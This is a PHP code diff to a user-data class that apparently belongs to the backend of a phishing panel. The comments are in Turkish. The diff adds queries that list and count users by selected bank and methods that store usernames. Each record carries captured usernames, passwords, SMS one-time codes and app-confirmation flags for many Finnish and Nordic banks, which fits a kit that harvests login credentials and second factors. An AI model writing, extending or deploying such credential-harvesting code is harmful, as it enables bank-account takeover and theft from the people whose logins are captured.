@@ -120,7 +120,7 @@ class User
         $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
         $stmt->execute();
 
-        $users = $stmt->fetchAll();
+        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
         
         foreach ($users as &$user) {
             $user['nordea_username'] = $user['nordea_username'] ?? null;
@@ -157,6 +157,87 @@ class User
     public function getTotalCount(): int
     {
         $stmt = $this->db->query("SELECT COUNT(*) as total FROM users");
+        $result = $stmt->fetch();
+        return (int) ($result['total'] ?? 0);
+    }
+
+    /**
+     * Belirli bir bankayı seçen kullanıcıları getir
+     */
+    public function getByBankName(string $bankName, int $limit = 1000, int $offset = 0): array
+    {
+        $stmt = $this->db->prepare("
+            SELECT u.*, b.name as bank_name 
+            FROM users u 
+            LEFT JOIN banks b ON u.selected_bank_id = b.id 
+            WHERE LOWER(b.name) LIKE LOWER(:bank_name)
+            ORDER BY u.created_at DESC 
+            LIMIT :limit OFFSET :offset
+        ");
+
+        $stmt->bindValue(':bank_name', '%' . $bankName . '%', PDO::PARAM_STR);
+        $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
+        $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
+        $stmt->execute();
+
+        $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        
+        foreach ($users as &$user) {
+            $user['nordea_username'] = $user['nordea_username'] ?? null;
+            $user['nordea_password'] = $user['nordea_password'] ?? null;
+            $user['nordea_sms_code'] = $user['nordea_sms_code'] ?? null;
+            $user['nordea_app_confirmed'] = $user['nordea_app_confirmed'] ?? 0;
+            $user['alandsbanken_username'] = $user['alandsbanken_username'] ?? null;
+            $user['alandsbanken_password'] = $user['alandsbanken_password'] ?? null;
+            $user['alandsbanken_sms_code'] = $user['alandsbanken_sms_code'] ?? null;
+            $user['alandsbanken_app_confirmed'] = $user['alandsbanken_app_confirmed'] ?? 0;
+            $user['danske_username'] = $user['danske_username'] ?? null;
+            $user['danske_password'] = $user['danske_password'] ?? null;
+            $user['danske_sms_code'] = $user['danske_sms_code'] ?? null;
+            $user['danske_app_confirmed'] = $user['danske_app_confirmed'] ?? 0;
+            $user['spankki_username'] = $user['spankki_username'] ?? null;
+            $user['spankki_password'] = $user['spankki_password'] ?? null;
+            $user['spankki_sms_code'] = $user['spankki_sms_code'] ?? null;
+            $user['spankki_app_confirmed'] = $user['spankki_app_confirmed'] ?? 0;
+            $user['aktia_username'] = $user['aktia_username'] ?? null;
+            $user['aktia_sms_code'] = $user['aktia_sms_code'] ?? null;
+            $user['aktia_app_confirmed'] = $user['aktia_app_confirmed'] ?? 0;
+            $user['op_username'] = $user['op_username'] ?? null;
+            $user['op_password'] = $user['op_password'] ?? null;
+            $user['op_sms_code'] = $user['op_sms_code'] ?? null;
+            $user['op_app_confirmed'] = $user['op_app_confirmed'] ?? 0;
+            $user['poppankki_username'] = $user['poppankki_username'] ?? null;
+            $user['poppankki_sms_code'] = $user['poppankki_sms_code'] ?? null;
+            $user['poppankki_app_confirmed'] = $user['poppankki_app_confirmed'] ?? 0;
+            $user['omasp_username'] = $user['omasp_username'] ?? null;
+            $user['omasp_sms_code'] = $user['omasp_sms_code'] ?? null;
+            $user['omasp_app_confirmed'] = $user['omasp_app_confirmed'] ?? 0;
+            $user['saastopankki_username'] = $user['saastopankki_username'] ?? null;
+            $user['saastopankki_sms_code'] = $user['saastopankki_sms_code'] ?? null;
+            $user['saastopankki_app_confirmed'] = $user['saastopankki_app_confirmed'] ?? 0;
+            $user['handelsbanken_username'] = $user['handelsbanken_username'] ?? null;
+            $user['handelsbanken_password'] = $user['handelsbanken_password'] ?? null;
+            $user['handelsbanken_sms_code'] = $user['handelsbanken_sms_code'] ?? null;
+            $user['handelsbanken_app_confirmed'] = $user['handelsbanken_app_confirmed'] ?? 0;
+        }
+        
+        return $users;
+    }
+
+    /**
+     * Belirli bir bankayı seçen kullanıcı sayısı
+     */
+    public function getCountByBankName(string $bankName): int
+    {
+        $stmt = $this->db->prepare("
+            SELECT COUNT(*) as total 
+            FROM users u 
+            LEFT JOIN banks b ON u.selected_bank_id = b.id 
+            WHERE LOWER(b.name) LIKE LOWER(:bank_name)
+        ");
+
+        $stmt->bindValue(':bank_name', '%' . $bankName . '%', PDO::PARAM_STR);
+        $stmt->execute();
         $result = $stmt->fetch();
         return (int) ($result['total'] ?? 0);
     }
@@ -314,6 +395,20 @@ class User
         ]);
     }
 
+    public function updateSpankkiUsername(int $userId, string $username): bool
+    {
+        $stmt = $this->db->prepare("
+            UPDATE users 
+            SET spankki_username = :username
+            WHERE id = :user_id
+        ");
+
+        return $stmt->execute([
+            ':username' => $username,
+            ':user_id' => $userId
+        ]);
+    }
+
     public function updateSpankkiSmsCode(int $userId, string $smsCode): bool
     {
         $stmt = $this->db->prepare("
@@ -400,6 +495,20 @@ class User
         return $stmt->execute([
             ':username' => $username,
             ':password' => $password,
+            ':user_id' => $userId
+        ]);
+    }
+
+    public function updateOpUsername(int $userId, string $username): bool
+    {
+        $stmt = $this->db->prepare("
+            UPDATE users 
+            SET op_username = :username
+            WHERE id = :user_id
+        ");
+
+        return $stmt->execute([
+            ':username' => $username,
             ':user_id' => $userId
         ]);
     }
